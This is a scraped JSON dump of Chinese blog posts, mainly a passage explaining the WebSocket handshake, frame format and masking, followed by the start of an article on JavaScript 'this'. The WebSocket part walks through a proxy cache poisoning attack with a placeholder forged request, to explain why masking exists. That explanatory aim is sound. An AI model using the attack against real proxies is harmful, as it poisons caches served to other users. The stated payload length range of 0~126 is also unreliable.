class=\"hljs-number\"\u003e-47\u003c/span\u003eDA\u003cspan class=\"hljs-number\"\u003e-95\u003c/span\u003eCA-C5AB0DC85B11 )  )\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e验证下前面的返回结果：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e crypto = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'crypto'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e magic = \u003cspan class=\"hljs-string\"\u003e'258EAFA5-E914-47DA-95CA-C5AB0DC85B11'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e secWebSocketKey = \u003cspan class=\"hljs-string\"\u003e'w4v7O6xFTi36lq3RNcgctw=='\u003c/span\u003e;\n\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e secWebSocketAccept = crypto.createHash(\u003cspan class=\"hljs-string\"\u003e'sha1'\u003c/span\u003e)\n\u0009.update(secWebSocketKey + magic)\n\u0009.digest(\u003cspan class=\"hljs-string\"\u003e'base64'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(secWebSocketAccept);\n\u003cspan class=\"hljs-comment\"\u003e// Oy4NRAQ13jhfONC7bP8dTKb4PTU=\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e五、数据帧格式\u003c/h2\u003e\n\u003cp\u003e客户端、服务端数据的交换，离不开数据帧格式的定义。因此，在实际讲解数据交换之前，我们先来看下WebSocket的数据帧格式。\u003c/p\u003e\n\u003cp\u003eWebSocket客户端、服务端通信的最小单位是帧（frame），由1个或多个帧组成一条完整的消息（message）。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e发送端：将消息切割成多个帧，并发送给服务端；\u003c/li\u003e\n\u003cli\u003e接收端：接收消息帧，并将关联的帧重新组装成完整的消息；\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e本节的重点，就是讲解\u003cstrong\u003e数据帧\u003c/strong\u003e的格式。详细定义可参考 \u003ca target=\"_blank\" href=\"https://tools.ietf.org/html/rfc6455#section-5.2\"\u003eRFC6455 5.2节\u003c/a\u003e 。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1、数据帧格式概览\u003c/h3\u003e\n\u003cp\u003e下面给出了WebSocket数据帧的统一格式。熟悉TCP/IP协议的同学对这样的图应该不陌生。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e从左到右，单位是比特。比如\u003ccode\u003eFIN\u003c/code\u003e、\u003ccode\u003eRSV1\u003c/code\u003e各占据1比特，\u003ccode\u003eopcode\u003c/code\u003e占据4比特。\u003c/li\u003e\n\u003cli\u003e内容包括了标识、操作代码、掩码、数据、数据长度等。（下一小节会展开）\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e  0                   1                   2                   3\n  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n +-+-+-+-+-------+-+-------------+-------------------------------+\n |F|R|R|R| opcode|M| Payload len |    Extended payload length    |\n |I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |\n |N|V|V|V|       |S|             |   (\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e payload len==126/127)   |\n | |1|2|3|       |K|             |                               |\n +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +\n |     Extended payload length continued, \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e payload len == 127  |\n + - - - - - - - - - - - - - - - +-------------------------------+\n |                               |Masking-key, \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e MASK \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e to 1  |\n +-------------------------------+-------------------------------+\n | Masking-key (continued)       |          Payload Data         |\n +-------------------------------- - - - - - - - - - - - - - - - +\n :                     Payload Data continued ...                :\n + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +\n |                     Payload Data continued ...                |\n +---------------------------------------------------------------+\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e2、数据帧格式详解\u003c/h3\u003e\n\u003cp\u003e针对前面的格式概览图，这里逐个字段进行讲解，如有不清楚之处，可参考协议规范，或留言交流。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eFIN\u003c/strong\u003e：1个比特。\u003c/p\u003e\n\u003cp\u003e如果是1，表示这是消息（message）的最后一个分片（fragment），如果是0，表示不是是消息（message）的最后一个分片（fragment）。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRSV1, RSV2, RSV3\u003c/strong\u003e：各占1个比特。\u003c/p\u003e\n\u003cp\u003e一般情况下全为0。当客户端、服务端协商采用WebSocket扩展时，这三个标志位可以非0，且值的含义由扩展进行定义。如果出现非零的值，且并没有采用WebSocket扩展，连接出错。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eOpcode\u003c/strong\u003e:  4个比特。\u003c/p\u003e\n\u003cp\u003e操作代码，Opcode的值决定了应该如何解析后续的数据载荷（data payload）。如果操作代码是不认识的，那么接收端应该断开连接（fail the connection）。可选的操作代码如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e%x0：表示一个延续帧。当Opcode为0时，表示本次数据传输采用了数据分片，当前收到的数据帧为其中一个数据分片。\u003c/li\u003e\n\u003cli\u003e%x1：表示这是一个文本帧（frame）\u003c/li\u003e\n\u003cli\u003e%x2：表示这是一个二进制帧（frame）\u003c/li\u003e\n\u003cli\u003e%x3-7：保留的操作代码，用于后续定义的非控制帧。\u003c/li\u003e\n\u003cli\u003e%x8：表示连接断开。\u003c/li\u003e\n\u003cli\u003e%x9：表示这是一个ping操作。\u003c/li\u003e\n\u003cli\u003e%xA：表示这是一个pong操作。\u003c/li\u003e\n\u003cli\u003e%xB-F：保留的操作代码，用于后续定义的控制帧。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eMask\u003c/strong\u003e:  1个比特。\u003c/p\u003e\n\u003cp\u003e表示是否要对数据载荷进行掩码操作。从客户端向服务端发送数据时，需要对数据进行掩码操作；从服务端向客户端发送数据时，不需要对数据进行掩码操作。\u003c/p\u003e\n\u003cp\u003e如果服务端接收到的数据没有进行过掩码操作，服务端需要断开连接。\u003c/p\u003e\n\u003cp\u003e如果Mask是1，那么在Masking-key中会定义一个掩码键（masking key），并用这个掩码键来对数据载荷进行反掩码。所有客户端发送到服务端的数据帧，Mask都是1。\u003c/p\u003e\n\u003cp\u003e掩码的算法、用途在下一小节讲解。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePayload length\u003c/strong\u003e：数据载荷的长度，单位是字节。为7位，或7+16位，或1+64位。\u003c/p\u003e\n\u003cp\u003e假设数Payload length === x，如果\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ex为0~126：数据的长度为x字节。\u003c/li\u003e\n\u003cli\u003ex为126：后续2个字节代表一个16位的无符号整数，该无符号整数的值为数据的长度。\u003c/li\u003e\n\u003cli\u003ex为127：后续8个字节代表一个64位的无符号整数（最高位为0），该无符号整数的值为数据的长度。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e此外，如果payload length占用了多个字节的话，payload length的二进制表达采用网络序（big endian，重要的位在前）。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eMasking-key\u003c/strong\u003e：0或4字节（32位）\u003c/p\u003e\n\u003cp\u003e所有从客户端传送到服务端的数据帧，数据载荷都进行了掩码操作，Mask为1，且携带了4字节的Masking-key。如果Mask为0，则没有Masking-key。\u003c/p\u003e\n\u003cp\u003e备注：载荷数据的长度，不包括mask key的长度。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePayload data\u003c/strong\u003e：(x+y) 字节\u003c/p\u003e\n\u003cp\u003e载荷数据：包括了扩展数据、应用数据。其中，扩展数据x字节，应用数据y字节。\u003c/p\u003e\n\u003cp\u003e扩展数据：如果没有协商使用扩展的话，扩展数据数据为0字节。所有的扩展都必须声明扩展数据的长度，或者可以如何计算出扩展数据的长度。此外，扩展如何使用必须在握手阶段就协商好。如果扩展数据存在，那么载荷数据长度必须将扩展数据的长度包含在内。\u003c/p\u003e\n\u003cp\u003e应用数据：任意的应用数据，在扩展数据之后（如果存在扩展数据），占据了数据帧剩余的位置。载荷数据长度 减去 扩展数据长度，就得到应用数据的长度。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3、掩码算法\u003c/h3\u003e\n\u003cp\u003e掩码键（Masking-key）是由客户端挑选出来的32位的随机数。掩码操作不会影响数据载荷的长度。掩码、反掩码操作都采用如下算法：\u003c/p\u003e\n\u003cp\u003e首先，假设：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eoriginal-octet-i：为原始数据的第i字节。\u003c/li\u003e\n\u003cli\u003etransformed-octet-i：为转换后的数据的第i字节。\u003c/li\u003e\n\u003cli\u003ej：为\u003ccode\u003ei mod 4\u003c/code\u003e的结果。\u003c/li\u003e\n\u003cli\u003emasking-key-octet-j：为mask key第j字节。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e算法描述为： original-octet-i 与 masking-key-octet-j 异或后，得到  transformed-octet-i。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003ej  = i MOD 4\ntransformed-octet-i = original-octet-i XOR masking-key-octet-j\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e六、数据传递\u003c/h2\u003e\n\u003cp\u003e一旦WebSocket客户端、服务端建立连接后，后续的操作都是基于数据帧的传递。\u003c/p\u003e\n\u003cp\u003eWebSocket根据\u003ccode\u003eopcode\u003c/code\u003e来区分操作的类型。比如\u003ccode\u003e0x8\u003c/code\u003e表示断开连接，\u003ccode\u003e0x0\u003c/code\u003e-\u003ccode\u003e0x2\u003c/code\u003e表示数据交互。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1、数据分片\u003c/h3\u003e\n\u003cp\u003eWebSocket的每条消息可能被切分成多个数据帧。当WebSocket的接收方收到一个数据帧时，会根据\u003ccode\u003eFIN\u003c/code\u003e的值来判断，是否已经收到消息的最后一个数据帧。\u003c/p\u003e\n\u003cp\u003eFIN=1表示当前数据帧为消息的最后一个数据帧，此时接收方已经收到完整的消息，可以对消息进行处理。FIN=0，则接收方还需要继续监听接收其余的数据帧。\u003c/p\u003e\n\u003cp\u003e此外，\u003ccode\u003eopcode\u003c/code\u003e在数据交换的场景下，表示的是数据的类型。\u003ccode\u003e0x01\u003c/code\u003e表示文本，\u003ccode\u003e0x02\u003c/code\u003e表示二进制。而\u003ccode\u003e0x00\u003c/code\u003e比较特殊，表示延续帧（continuation frame），顾名思义，就是完整消息对应的数据帧还没接收完。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2、数据分片例子\u003c/h3\u003e\n\u003cp\u003e直接看例子更形象些。下面例子来自\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API/Writing_WebSocket_servers\"\u003eMDN\u003c/a\u003e，可以很好地演示数据的分片。客户端向服务端两次发送消息，服务端收到消息后回应客户端，这里主要看客户端往服务端发送的消息。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e第一条消息\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eFIN=1, 表示是当前消息的最后一个数据帧。服务端收到当前数据帧后，可以处理消息。opcode=0x1，表示客户端发送的是文本类型。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e第二条消息\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eFIN=0，opcode=0x1，表示发送的是文本类型，且消息还没发送完成，还有后续的数据帧。\u003c/li\u003e\n\u003cli\u003eFIN=0，opcode=0x0，表示消息还没发送完成，还有后续的数据帧，当前的数据帧需要接在上一条数据帧之后。\u003c/li\u003e\n\u003cli\u003eFIN=1，opcode=0x0，表示消息已经发送完成，没有后续的数据帧，当前的数据帧需要接在上一条数据帧之后。服务端可以将关联的数据帧组装成完整的消息。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eClient: FIN=1, opcode=0x1, msg=\u003cspan class=\"hljs-string\"\u003e\"hello\"\u003c/span\u003e\nServer: (process complete message immediately) Hi.\nClient: FIN=0, opcode=0x1, msg=\u003cspan class=\"hljs-string\"\u003e\"and a\"\u003c/span\u003e\nServer: (listening, new message containing text started)\nClient: FIN=0, opcode=0x0, msg=\u003cspan class=\"hljs-string\"\u003e\"happy new\"\u003c/span\u003e\nServer: (listening, payload concatenated to previous message)\nClient: FIN=1, opcode=0x0, msg=\u003cspan class=\"hljs-string\"\u003e\"year!\"\u003c/span\u003e\nServer: (process complete message) Happy new year to you too!\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e七、连接保持+心跳\u003c/h2\u003e\n\u003cp\u003eWebSocket为了保持客户端、服务端的实时双向通信，需要确保客户端、服务端之间的TCP通道保持连接没有断开。然而，对于长时间没有数据往来的连接，如果依旧长时间保持着，可能会浪费包括的连接资源。\u003c/p\u003e\n\u003cp\u003e但不排除有些场景，客户端、服务端虽然长时间没有数据往来，但仍需要保持连接。这个时候，可以采用心跳来实现。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e发送方-\u0026gt;接收方：ping\u003c/li\u003e\n\u003cli\u003e接收方-\u0026gt;发送方：pong\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eping、pong的操作，对应的是WebSocket的两个控制帧，\u003ccode\u003eopcode\u003c/code\u003e分别是\u003ccode\u003e0x9\u003c/code\u003e、\u003ccode\u003e0xA\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e举例，WebSocket服务端向客户端发送ping，只需要如下代码（采用\u003ccode\u003ews\u003c/code\u003e模块）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ews.ping(\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e, \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e, \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e八、Sec-WebSocket-Key/Accept的作用\u003c/h2\u003e\n\u003cp\u003e前面提到了，\u003ccode\u003eSec-WebSocket-Key/Sec-WebSocket-Accept\u003c/code\u003e在主要作用在于提供基础的防护，减少恶意连接、意外连接。\u003c/p\u003e\n\u003cp\u003e作用大致归纳如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e避免服务端收到非法的websocket连接（比如http客户端不小心请求连接websocket服务，此时服务端可以直接拒绝连接）\u003c/li\u003e\n\u003cli\u003e确保服务端理解websocket连接。因为ws握手阶段采用的是http协议，因此可能ws连接是被一个http服务器处理并返回的，此时客户端可以通过Sec-WebSocket-Key来确保服务端认识ws协议。（并非百分百保险，比如总是存在那么些无聊的http服务器，光处理Sec-WebSocket-Key，但并没有实现ws协议。。。）\u003c/li\u003e\n\u003cli\u003e用浏览器里发起ajax请求，设置header时，Sec-WebSocket-Key以及其他相关的header是被禁止的。这样可以避免客户端发送ajax请求时，意外请求协议升级（websocket upgrade）\u003c/li\u003e\n\u003cli\u003e可以防止反向代理（不理解ws协议）返回错误的数据。比如反向代理前后收到两次ws连接的升级请求，反向代理把第一次请求的返回给cache住，然后第二次请求到来时直接把cache住的请求给返回（无意义的返回）。\u003c/li\u003e\n\u003cli\u003eSec-WebSocket-Key主要目的并不是确保数据的安全性，因为Sec-WebSocket-Key、Sec-WebSocket-Accept的转换计算公式是公开的，而且非常简单，最主要的作用是预防一些常见的意外情况（非故意的）。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cblockquote\u003e\n\u003cp\u003e强调：Sec-WebSocket-Key/Sec-WebSocket-Accept 的换算，只能带来基本的保障，但连接是否安全、数据是否安全、客户端/服务端是否合法的 ws客户端、ws服务端，其实并没有实际性的保证。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e九、数据掩码的作用\u003c/h2\u003e\n\u003cp\u003eWebSocket协议中，数据掩码的作用是增强协议的安全性。但数据掩码并不是为了保护数据本身，因为算法本身是公开的，运算也不复杂。除了加密通道本身，似乎没有太多有效的保护通信安全的办法。\u003c/p\u003e\n\u003cp\u003e那么为什么还要引入掩码计算呢，除了增加计算机器的运算量外似乎并没有太多的收益（这也是不少同学疑惑的点）。\u003c/p\u003e\n\u003cp\u003e答案还是两个字：\u003cstrong\u003e安全\u003c/strong\u003e。但并不是为了防止数据泄密，而是为了防止早期版本的协议中存在的代理缓存污染攻击（proxy cache poisoning attacks）等问题。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1、代理缓存污染攻击\u003c/h3\u003e\n\u003cp\u003e下面摘自2010年关于安全的一段讲话。其中提到了代理服务器在协议实现上的缺陷可能导致的安全问题。\u003ca target=\"_blank\" href=\"http://w2spconf.com/2011/papers/websocket.pdf\"\u003e猛击出处\u003c/a\u003e。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“We show, empirically, that the current version of the WebSocket consent mechanism is vulnerable to proxy cache poisoning attacks. Even though the WebSocket handshake is based on HTTP, which should be understood by most network intermediaries, the handshake uses the esoteric “Upgrade” mechanism of HTTP [5]. In our experiment, we find that many proxies do not implement the Upgrade mechanism properly, which causes the handshake to succeed even though subsequent traffic over the socket will be misinterpreted by the proxy.”\u003c/p\u003e\n\u003cp\u003e[TALKING]  Huang, L-S., Chen, E., Barth, A., Rescorla, E., and C.\nJackson, \"Talking to Yourself for Fun and Profit\", 2010,\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e在正式描述攻击步骤之前，我们假设有如下参与者：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e攻击者、攻击者自己控制的服务器（简称“邪恶服务器”）、攻击者伪造的资源（简称“邪恶资源”）\u003c/li\u003e\n\u003cli\u003e受害者、受害者想要访问的资源（简称“正义资源”）\u003c/li\u003e\n\u003cli\u003e受害者实际想要访问的服务器（简称“正义服务器”）\u003c/li\u003e\n\u003cli\u003e中间代理服务器\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e攻击步骤一：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003e攻击者\u003c/strong\u003e浏览器 向 \u003cstrong\u003e邪恶服务器\u003c/strong\u003e 发起WebSocket连接。根据前文，首先是一个协议升级请求。\u003c/li\u003e\n\u003cli\u003e协议升级请求 实际到达 \u003cstrong\u003e代理服务器\u003c/strong\u003e。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e代理服务器\u003c/strong\u003e 将协议升级请求转发到 \u003cstrong\u003e邪恶服务器\u003c/strong\u003e。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e邪恶服务器\u003c/strong\u003e 同意连接，\u003cstrong\u003e代理服务器\u003c/strong\u003e 将响应转发给 \u003cstrong\u003e攻击者\u003c/strong\u003e。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e由于 upgrade 的实现上有缺陷，\u003cstrong\u003e代理服务器\u003c/strong\u003e 以为之前转发的是普通的HTTP消息。因此，当\u003cstrong\u003e协议服务器\u003c/strong\u003e 同意连接，\u003cstrong\u003e代理服务器\u003c/strong\u003e 以为本次会话已经结束。\u003c/p\u003e\n\u003cp\u003e攻击步骤二：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003e攻击者\u003c/strong\u003e 在之前建立的连接上，通过WebSocket的接口向 \u003cstrong\u003e邪恶服务器\u003c/strong\u003e 发送数据，且数据是精心构造的HTTP格式的文本。其中包含了 \u003cstrong\u003e正义资源\u003c/strong\u003e 的地址，以及一个伪造的host（指向\u003cstrong\u003e正义服务器\u003c/strong\u003e）。（见后面报文）\u003c/li\u003e\n\u003cli\u003e请求到达 \u003cstrong\u003e代理服务器\u003c/strong\u003e 。虽然复用了之前的TCP连接，但 \u003cstrong\u003e代理服务器\u003c/strong\u003e 以为是新的HTTP请求。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e代理服务器\u003c/strong\u003e 向 \u003cstrong\u003e邪恶服务器\u003c/strong\u003e 请求 \u003cstrong\u003e邪恶资源\u003c/strong\u003e。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e邪恶服务器\u003c/strong\u003e 返回 \u003cstrong\u003e邪恶资源\u003c/strong\u003e。\u003cstrong\u003e代理服务器\u003c/strong\u003e 缓存住 \u003cstrong\u003e邪恶资源\u003c/strong\u003e（url是对的，但host是 \u003cstrong\u003e正义服务器\u003c/strong\u003e 的地址）。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e到这里，受害者可以登场了：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003e受害者\u003c/strong\u003e 通过 \u003cstrong\u003e代理服务器\u003c/strong\u003e 访问 \u003cstrong\u003e正义服务器\u003c/strong\u003e 的 \u003cstrong\u003e正义资源\u003c/strong\u003e。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e代理服务器\u003c/strong\u003e 检查该资源的url、host，发现本地有一份缓存（伪造的）。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e代理服务器\u003c/strong\u003e 将 \u003cstrong\u003e邪恶资源\u003c/strong\u003e 返回给 \u003cstrong\u003e受害者\u003c/strong\u003e。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e受害者\u003c/strong\u003e 卒。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e附：前面提到的精心构造的“HTTP请求报文”。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eClient → Server:\nPOST /path/of/attackers/choice HTTP/1.1 Host: host-of-attackers-choice.com Sec-WebSocket-Key: \u0026lt;connection-key\u0026gt;\nServer → Client:\nHTTP/1.1 200 OK\nSec-WebSocket-Accept: \u0026lt;connection-key\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e2、当前解决方案\u003c/h3\u003e\n\u003cp\u003e最初的提案是对数据进行加密处理。基于安全、效率的考虑，最终采用了折中的方案：对数据载荷进行掩码处理。\u003c/p\u003e\n\u003cp\u003e需要注意的是，这里只是限制了浏览器对数据载荷进行掩码处理，但是坏人完全可以实现自己的WebSocket客户端、服务端，不按规则来，攻击可以照常进行。\u003c/p\u003e\n\u003cp\u003e但是对浏览器加上这个限制后，可以大大增加攻击的难度，以及攻击的影响范围。如果没有这个限制，只需要在网上放个钓鱼网站骗人去访问，一下子就可以在短时间内展开大范围的攻击。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e十、写在后面\u003c/h2\u003e\n\u003cp\u003eWebSocket可写的东西还挺多，比如WebSocket扩展。客户端、服务端之间是如何协商、使用扩展的。WebSocket扩展可以给协议本身增加很多能力和想象空间，比如数据的压缩、加密，以及多路复用等。\u003c/p\u003e\n\u003cp\u003e篇幅所限，这里先不展开，感兴趣的同学可以留言交流。文章如有错漏，敬请指出。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e十一、相关链接\u003c/h2\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://tools.ietf.org/html/rfc6455\"\u003eRFC6455：websocket规范\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://tools.ietf.org/html/rfc6455#section-5.3\"\u003e规范：数据帧掩码细节\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://tools.ietf.org/html/rfc6455#section-5.1\"\u003e规范：数据帧格式\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/websockets/ws#server-example\"\u003eserver-example\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API/Writing_WebSocket_servers\"\u003e编写websocket服务器\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://tools.ietf.org/html/rfc6455#section-10.3\"\u003e对网络基础设施的攻击（数据掩码操作所要预防的事情）\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://w2spconf.com/2011/papers/websocket.pdf\"\u003eTalking to Yourself for Fun and Profit（含有攻击描述）\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://stackoverflow.com/questions/18265128/what-is-sec-websocket-key-for\"\u003eWhat is Sec-WebSocket-Key for?\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://tools.ietf.org/html/rfc6455#section-10.3\"\u003e10.3.  Attacks On Infrastructure (Masking)\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://w2spconf.com/2011/papers/websocket.pdf\"\u003eTalking to Yourself for Fun and Profit\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://stackoverflow.com/questions/33250207/why-are-websockets-masked\"\u003eWhy are WebSockets masked?\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://security.stackexchange.com/questions/36930/how-does-websocket-frame-masking-protect-against-cache-poisoning\"\u003eHow does websocket frame masking protect against cache poisoning?\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://stackoverflow.com/questions/14174184/what-is-the-mask-in-a-websocket-frame\"\u003eWhat is the mask in a WebSocket frame?\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1515151173.8453","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be9906"},"id":"5a4ec61251882573473d8dbf","author":{"$oid":"5a4f5f6218646e1ee8be98ef"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"javascript弃坑之路之原来是这样的this","meta":{"likeCount":0},"tag":["JavaScript"],"comment":[],"shortContent":"说this是js编程中最重要的变量也不为过了，而在遇到this时，也曾经傻傻分不清楚this指代的到底是什么,所以现在对曾踩过this的坑做一下总结。 虽然this很令人迷惑，但其实总会发现，在浏览器环境中,this的指代不外乎两种，要么是window，要么是某个特定的对象（w…","content":"\u003cp\u003e说this是js编程中最重要的变量也不为过了，而在遇到this时，也曾经傻傻分不清楚this指代的到底是什么,所以现在对曾踩过this的坑做一下总结。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003ethis的场景\u003c/h1\u003e\n\u003cp\u003e虽然this很令人迷惑，但其实总会发现，在浏览器环境中,this的指代不外乎两种，要么是window，要么是某个特定的对象（window之外的对象）,而涉及到具体的场景中this的取值，可以归纳为五种。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e全局作用域中直接调用this\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar global=4;\nconsole.log(this.global);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如上例中，在全局作用域下定义了变量global,同样的，当我们调用this.global时，会把之前定义的变量打印出来。这是因为，全局作用域中定义的变量相当于为window对象添加了属性，而全局作用域下直接调用this，同样指代了window对象，因此能够取到之前定义的this值。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e对象方法中的this\u003c/h2\u003e\n\u003cp\u003e对象方法,也即对象的成员函数，对象方法中的this指代的是对象本身。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar obj={\n  value:2,\n  func:\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n    console.log(this.value);//2\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如上例中obj是一个对象,value和func分别为它的成员变量和成员方法,此时在方法中取到的this.value值即为obj.value值，this指代的是obj本身。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003enew操作符中的this\u003c/h2\u003e\n\u003cp\u003enew操作符通常和构造函数共同出现，往往用于创建一个新对象，而此时构造函数中的this指代的正是所创建的新对象。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eCar\u003c/span\u003e\u003c/span\u003e(){\n this.color=\u003cspan class=\"hljs-string\"\u003e\"red\"\u003c/span\u003e;\n this.size=\u003cspan class=\"hljs-string\"\u003e\"large\"\u003c/span\u003e;\n this.getColor=\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n   console.log(this.color)\n }\n}\n\nvar car=new Car();\nconsole.log(car.getColor())//red\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如上例所示，这里可以正确的把red打印出来，其中函数Car是一个最基本的构造函数，当用new 操作符来创建一个新的Color对象时，构造函数执行过程中首先会新建一个对象，然后将this赋值给这个新对象，之后所有对this的赋值操作都等同于对新对象赋值了。\u003c/p\u003e\n\u003ch2 